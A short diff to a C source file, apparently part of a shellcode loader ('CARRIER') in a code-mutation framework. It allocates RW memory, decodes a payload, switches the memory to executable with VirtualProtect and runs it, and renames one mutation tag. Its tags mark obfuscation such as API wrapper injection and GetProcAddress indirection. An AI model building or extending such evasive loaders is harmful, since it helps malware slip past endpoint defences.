@@ -1,7 +1,7 @@
 /* MODULE: CARRIER
  * TYPE: alloc_rw_rx
  * DESC: VirtualAlloc(RW) → Decode → VirtualProtect(RX) → Execute
- * MUTATIONS: api_wrapper_injection, getprocaddress_indirection, staged_rx, execution_method
+ * MUTATIONS: api_wrapper_injection, getprocaddress_indirection, protection_transition, execution_method
  */
 #include "../header/definitions.h"
 #include "sc_checkpoint.h"
@@ -25,7 +25,7 @@ int carrier() {
     decode_payload(dest, PAYLOAD_LEN);
     // @MUTATE:api_sequence_obfuscation
 
-    // @MUTATE:staged_rx
+    // @MUTATE:protection_transition
     // @MUTATE:api_wrapper_injection(VirtualProtect)
     // @MUTATE:getprocaddress_indirection(VirtualProtect)
     if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
